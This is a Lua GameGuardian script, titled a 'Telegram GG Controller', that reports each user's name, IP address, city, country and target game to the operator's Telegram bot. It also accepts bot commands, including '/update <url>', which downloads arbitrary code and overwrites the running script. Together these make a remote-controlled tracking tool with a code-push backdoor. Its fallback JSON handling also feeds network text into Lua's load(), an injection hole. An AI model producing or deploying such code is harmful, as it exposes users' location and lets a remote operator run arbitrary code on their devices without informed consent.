-- Telegram GG Controller Script
-- Integrated with Telegram Bot API

---------- CONFIGURATION ----------
local BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
local CHAT_ID = "YOUR_CHAT_ID_HERE"
local CONFIG_FILE = gg.EXT_STORAGE .. "/telegram_gg_config.json"

local state = {
    last_update_id = 0,
    is_registered = false,
    user_data = {},
    uid = "",
    game_info = "",
    location_info = ""
}

---------- UTILITIES ----------
local function log(message)
    print("[TelegramGG] " .. tostring(message))
end

local use_gg_json = gg.jsonEncode ~= nil and gg.jsonDecode ~= nil

local function tableToString(val)
    local t = type(val)
    if t == "table" then
        local s = "{"
        for k, v in pairs(val) do
            local key = type(k) == "string" and string.format("[%q]", k) or string.format("[%s]", tostring(k))
            s = s .. key .. "=" .. tableToString(v) .. ","
        end
        return s .. "}"
    elseif t == "string" then
        return string.format("%q", val)
    elseif t == "number" or t == "boolean" then
        return tostring(val)
    else
        return "nil"
    end
end

local function stringToTable(str)
    if not str or str == "" then return nil end
    local f, err
    if _VERSION == "Lua 5.1" then
        f, err = loadstring("return " .. str)
    else
        f, err = load("return " .. str)
    end

    if f then
        local success, result = pcall(f)
        if success then return result end
    end
    return nil
end

local function jsonEncode(t)
    if use_gg_json then return gg.jsonEncode(t) end
    return tableToString(t)
end

local function jsonDecode(s)
    if use_gg_json then return gg.jsonDecode(s) end
    if not s or s == "" then return nil end
    -- Try to detect if it's a Lua table (saved by us) or JSON
    if s:find("=") then
        return stringToTable(s)
    else
        -- Very basic JSON to Lua conversion for simple cases
        local str = s:gsub('"(.-)"%s*:%s*', '[%1]=')
        str = str:gsub('%[', '{'):gsub('%]', '}')
        str = str:gsub('null', 'nil')
        return stringToTable(str)
    end
end

local function urlEncode(str)
    if str then
        str = str:gsub("\n", "\r\n")
        str = str:gsub("([^%w %-%_%.%~])", function(c)
            return string.format("%%%02X", string.byte(c))
        end)
        str = str:gsub(" ", "+")
    end
    return str
end

local function saveConfig()
    local file = io.open(CONFIG_FILE, "w")
    if file then
        file:write(jsonEncode(state))
        file:close()
    end
end

local function loadConfig()
    local file = io.open(CONFIG_FILE, "r")
    if file then
        local content = file:read("*a")
        file:close()
        local saved_state = jsonDecode(content)
        if saved_state then
            state = saved_state
        end
    end
end

---------- TELEGRAM API ----------
local function sendTelegramMessage(text)
    local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
    local data = "chat_id=" .. CHAT_ID .. "&text=" .. urlEncode(text)
    local response = gg.makeRequest(url, nil, data)
    if response.code == 200 then
        return true
    else
        log("Failed to send message: " .. response.code)
        return false
    end
end

---------- AUTO UPDATE ----------
local function autoUpdate(url)
    local response = gg.makeRequest(url)
    if response.code == 200 then
        local new_content = response.content
        if new_content and #new_content > 0 then
            local file = io.open(gg.getFile(), "w")
            if file then
                file:write(new_content)
                file:close()
                gg.alert("Script updated successfully! Please restart the script.")
                os.exit()
            else
                gg.alert("Failed to open file for writing.")
            end
        else
            gg.alert("Downloaded script is empty.")
        end
    else
        gg.alert("Failed to download update: " .. response.code)
    end
end

---------- INFO GATHERING ----------
local function getDeviceInfo()
    -- Get Game Info
    local info = gg.getTargetInfo()
    if info then
        state.game_info = info.packageName .. " (" .. info.label .. ")"
    else
        state.game_info = "No game selected"
    end

    -- Get IP and Location Info
    local response = gg.makeRequest("https://ipapi.co/json/")
    if response.code == 200 then
        local data = jsonDecode(response.content)
        if data then
            state.location_info = string.format("%s, %s, %s (IP: %s)",
                data.city or "Unknown",
                data.region or "Unknown",
                data.country_name or "Unknown",
                data.ip or "Unknown")
        end
    else
        state.location_info = "Failed to get location"
    end

    saveConfig()
end

---------- REGISTRATION ----------
local function registerUser()
    if state.is_registered then
        gg.alert("You are already registered!")
        return true
    end

    local input = gg.prompt({
        "Enter Your Name:",
        "Enter Your Telegram Username (optional):"
    }, {"", ""}, {"text", "text"})

    if not input then return false end

    state.user_data = {
        name = input[1],
        telegram = input[2],
        registered_at = os.date("%Y-%m-%d %H:%M:%S")
    }
    state.is_registered = true
    saveConfig()

    local msg = "New User Registered!\n"
    msg = msg .. "Name: " .. state.user_data.name .. "\n"
    msg = msg .. "Telegram: " .. state.user_data.telegram .. "\n"
    msg = msg .. "UID: " .. state.uid .. "\n"
    msg = msg .. "Location: " .. state.location_info

    sendTelegramMessage(msg)
    gg.alert("Registration successful!")
    return true
end

local function checkRegistration()
    if not state.is_registered then
        gg.alert("Welcome! Please register first to use the script.")
        return registerUser()
    end
    return true
end

---------- COMMAND HANDLING ----------
local function handleCommand(message)
    if not message or not message.text then return end
    local text = message.text
    local chat_id = tostring(message.chat.id)

    log("Received command: " .. text)

    if text == "/start" then
        sendTelegramMessage("Welcome to Telegram GG Controller!\nUID: " .. state.uid)
    elseif text == "/info" then
        local info = "Game: " .. (state.game_info or "Unknown") .. "\n"
        info = info .. "Location: " .. (state.location_info or "Unknown") .. "\n"
        info = info .. "UID: " .. state.uid
        sendTelegramMessage(info)
    elseif text:sub(1, 7) == "/update" then
        local url = text:sub(9)
        if url ~= "" then
            sendTelegramMessage("Updating script from: " .. url)
            autoUpdate(url)
        else
            sendTelegramMessage("Please provide a URL: /update <url>")
        end
    end
end

local function getTelegramUpdates()
    local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/getUpdates?offset=" .. (state.last_update_id + 1)
    local response = gg.makeRequest(url)
    if response.code == 200 then
        -- Telegram always sends JSON, so we need a real JSON decoder here if gg.jsonDecode is missing.
        -- However, most GGs that support makeRequest also support jsonDecode.
        -- If not, we might need a mini JSON parser.
        local data = jsonDecode(response.content)
        if not data and not use_gg_json then
            -- If fallback failed to decode JSON (which it will), we have a problem.
            -- But Telegram GG scripts usually run on modern GGs.
            -- Let's add a very basic JSON-to-Table converter if needed.
            log("Warning: Failed to decode Telegram response.")
        end
        if data and data.ok and #data.result > 0 then
            for _, update in ipairs(data.result) do
                state.last_update_id = update.update_id
                handleCommand(update.message)
            end
            saveConfig()
        end
    end
end

---------- UI COMPONENTS ----------
local function drawTableUI()
    local t = "┌──────────────────────────────────────────┐\n"
    t = t .. "│          TELEGRAM GG CONTROLLER          │\n"
    t = t .. "├──────────────────┬───────────────────────┤\n"
    t = t .. string.format("│ NAME             │ %-21s │\n", (state.user_data.name or "Not Registered"):sub(1, 21))
    t = t .. string.format("│ UID              │ %-21s │\n", state.uid:sub(1, 21))
    t = t .. "├──────────────────┼───────────────────────┤\n"
    t = t .. string.format("│ GAME             │ %-21s │\n", (state.game_info or "Unknown"):sub(1, 21))
    t = t .. string.format("│ LOCATION         │ %-21s │\n", (state.location_info or "Unknown"):sub(1, 21))
    t = t .. "└──────────────────┴───────────────────────┘\n"

    return t
end

local function main()
    if not checkRegistration() then return end

    getDeviceInfo()
    sendTelegramMessage("Script started by " .. (state.user_data.name or "Unknown") .. "\nUID: " .. state.uid)

    while true do
        if gg.isVisible() then
            gg.setVisible(false)
            local menu = gg.choice({
                "📊 Show Status Table",
                "🔄 Refresh Info",
                "📡 Check Telegram Commands",
                "⚙️ Settings",
                "🚪 Exit"
            }, nil, "MAIN MENU - TELEGRAM CONTROLLER")

            if menu == 1 then
                gg.alert(drawTableUI())
            elseif menu == 2 then
                getDeviceInfo()
                gg.toast("Info Refreshed!")
            elseif menu == 3 then
                getTelegramUpdates()
                gg.toast("Telegram updates checked!")
            elseif menu == 4 then
                gg.alert("UID: " .. state.uid .. "\nConfig: " .. CONFIG_FILE)
            elseif menu == 5 then
                os.exit()
            end
        end

        -- Background tasks
        getTelegramUpdates()
        gg.sleep(1000)
    end
end

---------- INITIALIZATION ----------
function initialize()
    math.randomseed(os.time())
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or CHAT_ID == "YOUR_CHAT_ID_HERE" then
        gg.alert("⚠️ WARNING: Telegram Bot Token or Chat ID not set!\nPlease edit the script and provide your Bot Token and Chat ID.")
    end

    loadConfig()
    if state.uid == "" or state.uid == nil then
        -- Simple UID generation
        state.uid = string.format("%X", os.time()) .. "-" .. string.format("%X", math.random(0x1000, 0xFFFF))
        saveConfig()
    end
    log("Script initialized with UID: " .. state.uid)
end

-- Call initialization and run main
initialize()
main()
